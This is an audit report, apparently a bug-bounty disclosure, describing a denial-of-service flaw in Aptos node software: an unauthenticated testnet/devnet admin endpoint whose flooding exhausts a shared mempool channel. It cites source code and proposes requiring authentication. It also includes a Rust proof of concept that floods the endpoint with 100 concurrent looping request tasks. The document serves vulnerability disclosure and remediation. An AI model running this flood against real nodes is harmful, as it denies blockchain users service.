# Audit Report

## Title
DoS via Unauthenticated Admin Service Channel Exhaustion on Testnet/Devnet Networks

## Summary
The admin service endpoint `/debug/mempool/parking-lot/addresses` is unauthenticated by default on testnet/devnet networks and shares the same `MempoolClientSender` channel with critical transaction submission paths. An attacker can flood this endpoint to exhaust the channel capacity or bounded executor, causing legitimate transaction submissions to fail with `try_send` errors.

## Finding Description
The vulnerability exists in the admin service's mempool endpoint handler. The `get_parking_lot_addresses()` function uses `try_send()` to communicate with the mempool coordinator via a shared channel. [1](#0-0) 

The admin service has no authentication by default on non-mainnet networks: [2](#0-1) 

When `authentication_configs` is empty (the default), all requests are automatically authenticated: [3](#0-2) 

The mempool coordinator processes client requests sequentially and uses a bounded executor with limited workers (default: 4): [4](#0-3) [5](#0-4) 

When spawning tasks for `GetAddressesFromParkingLot` requests, the coordinator blocks if the bounded executor is full: [6](#0-5) 

**Attack Path:**
1. Attacker sends rapid requests to unauthenticated `/debug/mempool/parking-lot/addresses` endpoint
2. Each request performs `try_send()` on the shared `MempoolClientSender` channel
3. The bounded executor (4 workers) becomes saturated processing these requests
4. The coordinator blocks at `bounded_executor.spawn().await`, unable to process other messages
5. Legitimate `SubmitTransaction` requests pile up in the channel buffer
6. Once the channel buffer is exhausted, subsequent `try_send()` calls fail
7. Transaction submissions via the API fail with channel errors

## Impact Explanation
**High Severity** - Per Aptos bug bounty criteria, this qualifies as "Validator node slowdowns" and "API crashes":

- **Denial of Service**: Legitimate transaction submissions fail, preventing users from interacting with the blockchain
- **API Unavailability**: The API cannot process transaction submission requests when the channel is full
- **Node Operation Disruption**: The mempool becomes unresponsive to client requests

While mainnet is protected by required authentication and the admin service being disabled by default, testnet and devnet networks are vulnerable: [7](#0-6) 

## Likelihood Explanation
**Medium on Testnet/Devnet, Very Low on Mainnet:**

- **Testnet/Devnet**: The admin service is enabled and unauthenticated by default, making the attack trivial to execute
- **Mainnet**: Protected by two mechanisms:
  - Admin service disabled by default
  - Authentication required if enabled (enforced by sanitizer) [8](#0-7) 

The attack requires sustaining a request rate that exceeds the processing capacity (4 concurrent workers), but this is achievable with standard HTTP flood techniques.

## Recommendation
Implement authentication for the admin service on ALL networks, not just mainnet:

```rust
// In config/src/config/admin_service_config.rs
impl ConfigOptimizer for AdminServiceConfig {
    fn optimize(
        node_config: &mut NodeConfig,
        _local_config_yaml: &Value,
        _node_type: NodeType,
        chain_id: Option<ChainId>,
    ) -> Result<bool, Error> {
        let mut modified_config = false;

        if node_config.admin_service.enabled.is_none() {
            // Disable admin service by default on all networks unless explicitly enabled
            node_config.admin_service.enabled = Some(false);
            modified_config = true;
        }

        // Require authentication even on testnet/devnet if enabled
        if node_config.admin_service.enabled == Some(true)
            && node_config.admin_service.authentication_configs.is_empty()
        {
            return Err(Error::ConfigSanitizerFailed(
                Self::get_sanitizer_name(),
                "Must enable authentication for AdminService on all networks.".into(),
            ));
        }

        Ok(modified_config)
    }
}
```

Additionally, consider implementing rate limiting on the admin service endpoint or using a separate dedicated channel for admin operations that doesn't interfere with critical transaction submission paths.

## Proof of Concept
```rust
// PoC: Flood the admin service endpoint to exhaust the mempool channel
// This would be run against a testnet/devnet node with default configuration

use reqwest;
use tokio;
use std::time::Duration;

#[tokio::main]
async fn main() {
    let admin_url = "http://testnet-node:9102/debug/mempool/parking-lot/addresses";
    let client = reqwest::Client::new();
    
    // Spawn 100 concurrent tasks flooding the endpoint
    let mut handles = vec![];
    for _ in 0..100 {
        let client = client.clone();
        let url = admin_url.to_string();
        handles.push(tokio::spawn(async move {
            loop {
                let _ = client.get(&url).send().await;
                tokio::time::sleep(Duration::from_millis(10)).await;
            }
        }));
    }
    
    // Meanwhile, attempt legitimate transaction submission
    tokio::time::sleep(Duration::from_secs(5)).await;
    
    // Transaction submission via API will start failing with channel errors
    let tx_url = "http://testnet-node:8080/v1/transactions";
    for i in 0..10 {
        match client.post(tx_url)
            .json(&serde_json::json!({"test": "transaction"}))
            .send()
            .await {
            Ok(resp) => println!("Attempt {}: Status {}", i, resp.status()),
            Err(e) => println!("Attempt {}: Failed - {}", i, e),
        }
        tokio::time::sleep(Duration::from_millis(500)).await;
    }
}
```

### Citations

**File:** crates/aptos-admin-service/src/server/mempool/mod.rs (L40-54)
```rust
async fn get_parking_lot_addresses(
    mempool_client_sender: MempoolClientSender,
) -> Result<Vec<(AccountAddress, u64)>, Canceled> {
    let (sender, receiver) = futures_channel::oneshot::channel();

    match mempool_client_sender
        .clone()
        .try_send(MempoolClientRequest::GetAddressesFromParkingLot(sender))
    {
        Ok(_) => receiver.await,
        Err(e) => {
            info!("Failed to send request for GetAddressesFromParkingLot: {e:?}");
            Err(Canceled)
        },
    }
```

**File:** config/src/config/admin_service_config.rs (L41-50)
```rust
impl Default for AdminServiceConfig {
    fn default() -> Self {
        Self {
            enabled: None,
            address: "0.0.0.0".to_string(),
            port: 9102,
            authentication_configs: vec![],
            malloc_stats_max_len: 2 * 1024 * 1024,
        }
    }
```

**File:** config/src/config/admin_service_config.rs (L67-77)
```rust
        if node_config.admin_service.enabled == Some(true) {
            if let Some(chain_id) = chain_id {
                if chain_id.is_mainnet()
                    && node_config.admin_service.authentication_configs.is_empty()
                {
                    return Err(Error::ConfigSanitizerFailed(
                        sanitizer_name,
                        "Must enable authentication for AdminService on mainnet.".into(),
                    ));
                }
            }
```

**File:** config/src/config/admin_service_config.rs (L93-103)
```rust
        if node_config.admin_service.enabled.is_none() {
            // Only enable the admin service if the chain is not mainnet
            let admin_service_enabled = if let Some(chain_id) = chain_id {
                !chain_id.is_mainnet()
            } else {
                false // We cannot determine the chain ID, so we disable the admin service
            };
            node_config.admin_service.enabled = Some(admin_service_enabled);

            modified_config = true; // The config was modified
        }
```

**File:** crates/aptos-admin-service/src/server/mod.rs (L154-156)
```rust
        let mut authenticated = false;
        if context.config.authentication_configs.is_empty() {
            authenticated = true;
```

**File:** mempool/src/shared_mempool/coordinator.rs (L90-93)
```rust
    // Use a BoundedExecutor to restrict only `workers_available` concurrent
    // worker tasks that can process incoming transactions.
    let workers_available = smp.config.shared_mempool_max_concurrent_inbound_syncs;
    let bounded_executor = BoundedExecutor::new(workers_available, executor.clone());
```

**File:** mempool/src/shared_mempool/coordinator.rs (L106-111)
```rust
    loop {
        let _timer = counters::MAIN_LOOP.start_timer();
        ::futures::select! {
            msg = client_events.select_next_some() => {
                handle_client_request(&mut smp, &bounded_executor, msg).await;
            },
```

**File:** mempool/src/shared_mempool/coordinator.rs (L219-223)
```rust
        MempoolClientRequest::GetAddressesFromParkingLot(callback) => {
            bounded_executor
                .spawn(tasks::process_parking_lot_addresses(smp.clone(), callback))
                .await;
        },
```
